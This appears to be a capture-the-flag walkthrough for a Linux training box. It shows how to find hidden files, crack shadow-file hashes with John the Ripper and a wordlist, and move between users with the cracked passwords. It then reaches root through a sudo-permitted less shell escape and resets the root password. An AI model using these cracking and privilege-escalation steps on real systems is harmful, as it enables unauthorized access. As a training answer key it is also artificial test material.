### Solution Guide: Scavenger Hunt

### flag_1:

Finding this flag is imperative to moving on quickly, as it contains the passwords from users before they were hacked. Luckily, it doesn't have a great hiding spot.

**Solution:**
Listing _all_ files in the student's home folder will reveal:

- `~/Desktop/.flag_1` 
- `~/Desktop/.pass_list.txt`

```bash
student:~ $ ls -Ra
.:
.   .00-motd        .bashrc Documents   .gnupg      Pictures    Public
..  .bash_logout    Desktop Downloads   .hushlogin  .profile    Videos

./Desktop
.   ..  .flag_1 .pass_list.txt

```

The contents of the `.flag_1` file read:

```bash
-------------------------------------------------------

 You found 'flag_1:$1$WYmnR327$5C1yY4flBxB1cLjkc92Tq.'

------------ Nice work. Find 7 more. ------------------
```

### flag_2:

A famous hacker had created a user on the system a year ago. Find this user, crack his password and login to his account.

**Solution:**
- The hacker is 'Kevin Mitnik'.

- Use these files to crack his password:

    - `~/Desktop/.pass_list.txt` 
    - `~/my-files/shadow`

```bash
student:~$ cd ~/Desktop/
student:Desktop\ $ john --wordlist=.pass_list.txt ../Documents/my-files/shadow
Created directory: /home/student/.john
Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein     (student)
trustno1    (mitnik)
2g 0:00:00:00 100% 3.030g/s 145.4p/s 290.9C/s 123456..webcam1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
student:Desktop\ $ 
student:Desktop\ $ 
student:Desktop\ $  john --show ../Documents/my-files/shadow
student:letmein:18197:0:99999:7:::
mitnik:trustno1:18197:0:99999:7:::

2 password hashes cracked, 0 left
student:Desktop\ $ 
student:Desktop\ $  su mitnik
Password:

You found flag_2:$1$PEDICYq8$6/U/a5Ykxw1OP0.eSrMZO0

mitnik:Desktop\ $
```

The password for the mitnik user is: `trustno1 `. Because the password changes happend _after_ the machine was hacked, we can still login as mitnik. 

### flag_3:

Find a ‘log’ file _and_ a zip file related to the hacker's name.  

- Use a compound command to figure out the unique count of IP Addresses in this log file. That number is a password.

**Solution:**
- The unique number of IP addresses is the password for the hidden zipfile. opening that zipfile will give you the credentials for the `babbage` user.

- Running `ls -Ra` in the  `/home/mitnik` directory, will show all the directories and files within them. The `.secret.zip` file is located in `/home/mitnik/Desktop`

```bash
mitnik:/\ $ cd /home/mitnik
mitnik:~\ $ls -Ra
.:
.   ..  .bash_logout    .bashrc Desktop Documents   Downloads   Pictures    .profile    Public  Videos

./Desktop
.   ..

./Documents
.   ..  .secret.zip

```

The log file is located in `/var/log/mitnik.log`

```bash
mitnik:~\ $ ls /var/log
alternatives.log  dpkg.log   lastlog     tallylog
apt               faillog    lxd         vboxadd-setup.log
auth.log          journal    mitnik.log  vboxadd-setup.log.1
btmp              kern.log   samba       vboxadd-setup.log.3
dist-upgrade      landscape  syslog      wtmp
mitnik:~\ $ 
```
Inspecting the file shows that the IP addresses are only at the beginning of each line.

```bash
73.211.34.100 "GET /bannerad/ad.htm HTTP/1.0" 200 198 "http://www.referrer.com/bannerad/ba_intro.htm" "Mozilla/4.01 (Macintosh; I; PPC)"
174.116.246.20 "GET /bannerad/ad.htm HTTP/1.0" 200 198 "http://www.referrer.com/bannerad/ba_intro.htm" "Mozilla/4.01 (Macintosh; I; PPC)"
23.135.3.168 "GET /bannerad/ad.htm HTTP/1.0" 200 198 "http://www.referrer.com/bannerad/ba_intro.htm" "Mozilla/4.01 (Macintosh; I; PPC)"
241.21.200.190 "GET /bannerad/ad.htm HTTP/1.0" 200 198 "http://www.referrer.com/bannerad/ba_intro.htm" "Mozilla/4.01 (Macintosh; I; PPC)"
111.58.233.100 "GET /bannerad/ad.htm HTTP/1.0" 200 198 "http://www.referrer.com/bannerad/ba_intro.htm" "Mozilla/4.01 (Macintosh; I; PPC)"
104.125.72.8 "GET /bannerad/ad.htm HTTP/1.0" 200 198 "http://www.referrer.com/bannerad/ba_intro.htm" "Mozilla/4.01 (Macintosh; I; PPC)"
122.201.225.11 "GET /bannerad/ad.htm HTTP/1.0" 200 198 "http://www.referrer.com/bannerad/ba_intro.htm" "Mozilla/4.01 (Macintosh; I; PPC)"
215.5.46.179 "GET /bannerad/ad.htm HTTP/1.0" 200 198 "http://www.referrer.com/bannerad/ba_intro.htm" "Mozilla/4.01 (Macintosh; I; PPC)"
```

We can create a compound command that counts the number of uniqe lines.

```bash
mitnik:~\ $ cat /var/log/mitnik.log | sort | uniq | wc -l
102
mitnik:~\ $ 
```

The password for the `/home/Documents/.secret.zip` is `102`

```bash
mitnik:~\ $ unzip ~/Documents/.secret.zip 
Archive:  /home/mitnik/Documents/.secret.zip
[/home/mitnik/Documents/.secret.zip] babbage password: 
 inflating: babbage                 
mitnik:~\ $ ls
babbage  Desktop  Documents  Downloads  Pictures  Public  Videos
mitnik:~\ $ cat babbage 
-----------------
babbage : freedom
-----------------
```

The password for the `babbage` user is `freedom`

Login as babbage to find flag_3:

```bash
mitnik:~\ $ su babbage
Password: 

You found flag_3:$1$Y9tp8XTi$m6pAR1bQ36oAh.At4G5s3.

babbage:mitnik\ $
```

### flag_4:

Find a directory with a list of hackers. Look for a file that has `read` permissions for the owner, `no` permissions for groups and `executable` only for everyone else.

**Solution:**

Switch to the babbage home folder and list all his files:

```bash
babbage:mitnik\ $ cd /home/babbage/
babbage:~\ $ ls -Ra
.:
.bash_logout  Desktop    Downloads  .profile  Videos
.bashrc       Documents  Pictures   Public

./Desktop:

./Documents:
ancheta    berners-lee  gonzalez  kernighan  mitnik   rossum      torvalds
anonymous  bevan        gosling   knuth      poulsen  stallman    wirth
assange    calce        hopper    lamo       pryce    stroustrup  woz
astra      gates        james     lovelace   ritchie  thompson
```

All of the hacker files are in his documents.

Switch to that directory and list all the permissions for those files.

```bash
babbage:Documents\ $ ls -l
total 4
--w--w-rwx 1 babbage babbage 0 Oct 30 21:05 ancheta
-rw-r--r-- 1 babbage babbage 0 Oct 30 21:05 anonymous
-rw-rw-rw- 1 babbage babbage 0 Oct 30 21:05 assange
---xrwxr-- 1 babbage babbage 0 Oct 30 21:05 astra
---x---r-- 1 babbage babbage 0 Oct 30 21:05 berners-lee
---xrwxr-- 1 babbage babbage 0 Oct 30 21:05 bevan
--w--w-rwx 1 babbage babbage 0 Oct 30 21:05 calce
-r-------x 1 babbage babbage 0 Oct 30 21:05 gates
-rw-r--r-- 1 babbage babbage 0 Oct 30 21:05 gonzalez
-r-------x 1 babbage babbage 0 Oct 30 21:05 gosling
-rw-rw-rw- 1 babbage babbage 0 Oct 30 21:05 hopper
---xrwxr-- 1 babbage babbage 0 Oct 30 21:05 james
---x---r-- 1 babbage babbage 0 Oct 30 21:05 kernighan
---x---r-- 1 babbage babbage 0 Oct 30 21:05 knuth
-rw-r--r-- 1 babbage babbage 0 Oct 30 21:05 lamo
-rwx-w---- 1 babbage babbage 0 Oct 30 21:05 lovelace
-rw-r--r-- 1 babbage babbage 0 Oct 30 21:05 mitnik
--w--w-rwx 1 babbage babbage 0 Oct 30 21:05 poulsen
--w--w-rwx 1 babbage babbage 0 Oct 30 21:05 pryce
-rw-rw-rw- 1 babbage babbage 0 Oct 30 21:05 ritchie
---xrwxr-- 1 babbage babbage 0 Oct 30 21:05 rossum
-r-------x 1 babbage babbage 5 Oct 30 20:10 stallman
-rw-rw-rw- 1 babbage babbage 0 Oct 30 21:05 stroustrup
---x---r-- 1 babbage babbage 0 Oct 30 21:05 thompson
-rwx-w---- 1 babbage babbage 0 Oct 30 21:05 torvalds
-rwx-w---- 1 babbage babbage 0 Oct 30 21:05 wirth
-r-------x 1 babbage babbage 0 Oct 30 21:05 woz
```

The files with `read` permissions for the owner, `no` permissions for groups and `executable` only for everyone else translate to permissions: `-r-------x`

There are 4 files with these permissions:

```bash
babbage:Documents\ $ ls -l | grep "^\-r\-\-\-\-\-\-\-x"
-r-------x 1 babbage babbage 0 Oct 30 21:05 gates
-r-------x 1 babbage babbage 0 Oct 30 21:05 gosling
-r-------x 1 babbage babbage 5 Oct 30 20:10 stallman
-r-------x 1 babbage babbage 0 Oct 30 21:05 woz
```

The stallman file has contents.

```bash
babbage:Documents\ $ cat gates
babbage:Documents\ $ cat gosling 
babbage:Documents\ $ cat woz
babbage:Documents\ $ cat stallman 
computer
```

The password to the stallman user is `computer`.

Login as Stallman.

```bash
babbage:Documents\ $ su stallman
Password: 

You found flag_4:$1$lGQ7QprJ$m4eE.b8jhvsp8CNbuIF5U0

stallman:Documents\ $
```

### flag_5:

This user is writing a bash script, except it isn't quite working yet. Find it, debug it and run it.

**Solution**:

Change to stallman's home directory and find the script file located in /home/stallman/Documents/flag5.sh.

```bash
stallman:Documents\ $ cd
stallman:~\ $ ls -Ra
.:
.   .bash_logout  Desktop    Downloads  .profile  Videos
..  .bashrc       Documents  Pictures   Public

./Desktop:
.  ..

./Documents:
.  ..  flag5.sh
```

Make the script executable and run it. 

```bash
stallman:~\ $ chmod +x Documents/flag5.sh 
stallman:~\ $ cd Documents/
stallman:Documents\ $ ls
flag5.sh
stallman:Documents\ $ ./flag5.sh 
./flag5.sh: line 4: syntax error near unexpected token `do'
./flag5.sh: line 4: `    do'
```

This syntax error says there's somethig wrong with line 4.

Look at the script. We can see that the first `for` loop has an extra `do`.

```bash
stallman:Documents\ $ head -6 flag5.sh 
#!/bin/bash
width=72
for i in ${0}; do
    do
    lines="$(wc -l < $1 | sed 's/ //g')"
    chars="$(wc -c < $1 | sed 's/ //g')"
```

Remove on of the `do`s.

The head of the script should now read:

```bash
#!/bin/bash
width=72
for i in ${0}; do
    lines="$(wc -l < $1 | sed 's/ //g')"
    chars="$(wc -c < $1 | sed 's/ //g')"
```

Run the script again:

```bash
stallman:Documents\ $ ./flag5.sh 
./flag5.sh: line 13: syntax error near unexpected token `else'
./flag5.sh: line 13: `        else'
```

Now there is an error on line 13.

```bash
    file=$(cat /var/tmp/5galf)
        if [ ${#file} -gt $width ]
        echo "$file" | fmt | sed -e '$s/^/  /' -e '2,$s/^/+ /'
        else
        echo "  $file"
        fi
```

Notice that this `if` statment is missing the `then` declaration.

Add the `then`:

```bash
    file=$(cat /var/tmp/5galf)
        if [ ${#file} -gt $width ]
        then
        echo "$file" | fmt | sed -e '$s/^/  /' -e '2,$s/^/+ /'
        else
        echo "  $file"
        fi
```

Run the script again:

```bash
stallman:Documents\ $ ./flag5.sh 
./flag5.sh: line 4: $1: ambiguous redirect
./flag5.sh: line 5: $1: ambiguous redirect
-----------------------------------------------------------------
File  ( lines,  characters, owned by stallman):
-----------------------------------------------------------------

------------------------------------------
+ 
+  You found flag_5:$1$zuzYyKCN$secHwYBXIELGqOv8rWzG00
+ 
+    ---------- sysadmin : passw0rd ----------
-----------------------------------------------------------------
```

Here we have flag_5.

The password for the `sysadmin` user is `passw0rd`.

**Alternate Solution**

Notice inside the script the line:
```bash
file=$(cat /var/tmp/5galf)
```
`5galf` is the location of flag_5

You can open this file directly to get the flag without fixing the script.

```bash
stallman:Documents\ $ cat /var/tmp/5galf 
------------------------------------------

 flag_5:$1$zuzYyKCN$secHwYBXIELGqOv8rWzG00

 ---------- sysadmin : passw0rd ----------
```

### flag_6:

Inspect this user's custom aliases.

**Solution 1:**

Login as the sysadmin user and look for an aliases in the .bashrc file.

```bash
stallman:Documents\ $ su sysadmin
Password: 
sysadmin:Documents\ $ cd
sysadmin:~\ $ nano .bashrc
```
Find the `#Alias definitions` section:

```
# Alias definitions.
alias flag="echo You found 'flag_6:\$1\$Qbq.XLLp\$oj.BXuxR2q99bJwNEFhSH1'"
```

Run the `flag` alias.

```bash
sysadmin:~\ $ flag
You found flag_6:$1$Qbq.XLLp$oj.BXuxR2q99bJwNEFhSH1
sysadmin:~\ $ 
```

**Solution 2:**

Run the `alias` command to list all this user's custom aliases and find the `flag` alias:

```bash
sysadmin:~\ $ alias
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias flag='echo You found \'flag_6:$1$Qbq.XLLp$oj.BXuxR2q99bJwNEFhSH1\''
alias grep='grep --color=auto'
alias l='ls -CF'
alias la='ls -A'
alias ll='ls -alF'
alias ls='ls --color=auto'
sysadmin:~\ $ 
```

Find an exploit to gain a root shell.

**Solution:**

Look at the `sudo` permissions for sysadmin:

```bash
sysadmin:~\ $ sudo -l
[sudo] password for sysadmin: 
Matching Defaults entries for sysadmin on scavenger-hunt:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadmin may run the following commands on
        scavenger-hunt:
    (ALL : ALL) /usr/bin/less
```

You have the ability to run `less` with `sudo`. 

Run less on a file and drop to a root shell:

```bash
sysadmin:~\ $ touch file && sudo less file
```

Once inside `less` open a bash shell with `:` then `!bash`

```bash
sysadmin:~\ $ touch file && sudo less file
root:~\ $ 
```

### flag_7:

Login as the root user.

**Solution:**
Now that you have a root shell, change the password for the root user and then login as `root`.

```bash
root:~\ $ passwd
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully
root:~\ $ exit
exit
!done  (press RETURN)
sysadmin:~\ $ su root
Password: 

You found flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0

root@scavenger-hunt:/home/sysadmin#
```

### flag_8:

Gather each of the 7 flags into a file and format it as if each flag was a username and password.

Crack these passwords for the final flag.

**Solution:**

Now that you have root access, you can search for all the flags (for non-`root` users) on the entire system and pull them into one file.

```bash
root@scavenger-hunt:~# grep -ir 'flag' /home/
/home/student/.bash_history:cat ~/Desktop/.flag_1 
/home/student/Desktop/.flag_1: You found 'flag_1:$1$WYmnR327$5C1yY4flBxB1cLjkc92Tq.'
/home/babbage/.bashrc:echo You found 'flag_3:$1$Y9tp8XTi$m6pAR1bQ36oAh.At4G5s3.'
/home/stallman/.bashrc:echo You found 'flag_4:$1$lGQ7QprJ$m4eE.b8jhvsp8CNbuIF5U0'
/home/mitnik/.bashrc:echo You found 'flag_2:$1$PEDICYq8$6/U/a5Ykxw1OP0.eSrMZO0'
/home/sysadmin/.bashrc:alias flag="echo You found 'flag_6:\$1\$Qbq.XLLp\$oj.BXuxR2q99bJwNEFhSH1'"
```

Output these results to a file called `flags`:

```bash
root@scavenger-hunt:~# grep -ir 'flag' /home/ > flags
```

Next, append `flag_5` from the `/var/tmp/5galf` to the `flags` file:

```bash
root@scavenger-hunt:~# cat /var/tmp/5galf >> flags
```

Append in `flag_7` from `root`'s `.bashrc` file:

```bash
root@scavenger-hunt:~# grep -r 'flag' /root/.bashrc
echo You found 'flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0'
root@scavenger-hunt:~# grep -r 'flag' /root/.bashrc >> flags
```

Edit your flags file with `nano` to remove all extraneous text and characters, to look like this:

```bash
flag_1:$1$WYmnR327$5C1yY4flBxB1cLjkc92Tq. 
flag_2:$1$PEDICYq8$6/U/a5Ykxw1OP0.eSrMZO0 
flag_3:$1$Y9tp8XTi$m6pAR1bQ36oAh.At4G5s3. 
flag_4:$1$lGQ7QprJ$m4eE.b8jhvsp8CNbuIF5U0 
flag_5:$1$zuzYyKCN$secHwYBXIELGqOv8rWzG00
flag_6:$1$Qbq.XLLp$oj.BXuxR2q99bJwNEFhSH1  
flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0 
```

- **Note**: be sure to remove the `\` backslashes from `flag_6`. 
  - *Alternatively*, as `sysadmin`, pipe the flag alias to `flags` with: `flag >> flags`

- Be sure to remove any duplicates.

- Don't forget to remove all quotation marks!

The `flags` file is now in a username:hashed-password format ready to be cracked by `john`!

Crack this file with `john` and the `pass_list.txt` you found in the `/home/student/Desktop/.pass_list.txt`

```bash
root@scavenger-hunt:~# john --wordlist=/home/student/Desktop/.pass_list.txt flags
Created directory: /root/.john
Loaded 7 password hashes with 7 different salts (md5crypt [MD5 32/64 X2])
Press 'q' or Ctrl-C to abort, almost any other key for status
Congratulations  (flag_1)
challenge.       (flag_7)
this             (flag_5)
You              (flag_2)
cyber            (flag_6)
completed        (flag_4)
6g 0:00:00:00 100% 17.14g/s 2577p/s 15165c/s 15165C/s 0000..00
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@scavenger-hunt:~# 
root@scavenger-hunt:~# 
root@scavenger-hunt:~# john --show flags 
flag_1:Congratulations
flag_2:You
flag_3:have
flag_4:completed
flag_5:this
flag_6:cyber
flag_7:challenge.

7 password hashes cracked, 0 left
root@scavenger-hunt:~# 
```
